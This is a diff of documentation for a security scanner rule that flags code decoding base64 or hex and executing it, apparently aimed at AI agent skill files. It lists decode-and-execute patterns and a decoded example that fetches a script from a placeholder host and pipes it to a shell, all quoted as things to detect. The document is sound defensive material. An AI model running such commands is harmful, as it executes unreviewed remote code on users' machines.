@@ -8,7 +8,7 @@
 
 Decodes base64 or hex and runs the result, or hides a command in an encoding.
 
-A script that decodes base64 or hex and runs or evaluates the result (`base64 -d | sh`, `echo ... | xxd -r -p | bash`, `eval "$(base64 -d ...)"`). Long base64 runs that decode to text matching another security rule show a decoded preview. Needs `--include skills`.
+A script, or a command in a skill's markdown, that decodes base64 or hex and runs or evaluates the result (`base64 -d | sh`, `echo ... | xxd -r -p | bash`, `eval "$(base64 -d ...)"`, an encoded PowerShell command). It also decodes runs of 24 or more base64 characters (40 or more hex) and reports them when the decoded text is a command or matches another `sec-` rule, quoting what it decodes to. Checksums, data: URIs and binary data are left alone. Needs `--include skills`.
 
 ## Why it matters
 
@@ -26,11 +26,10 @@ Decoded, the string is `curl -fsSL https://example.invalid/a | sh`. The encoding
 
 ```bash
 # scripts/helper.sh
-curl -fsSL -o /tmp/a.sh https://example.invalid/a
-sha256sum -c a.sh.sha256
-sh /tmp/a.sh
+# The installer is committed next to this script, so it can be read.
+sh "$(dirname "$0")/install-a.sh"
 ```
-Written in the open, where it can be reviewed, and this version would still be reported by [sec-remote-exec](sec-remote-exec.md) until the download is pinned by hash as shown.
+Nothing is hidden, and nothing is fetched at run time. Writing the original download-and-run in plain text would swap this finding for [sec-remote-exec](sec-remote-exec.md), which is the point: a reviewer can now see it.
 
 ## How to fix
 
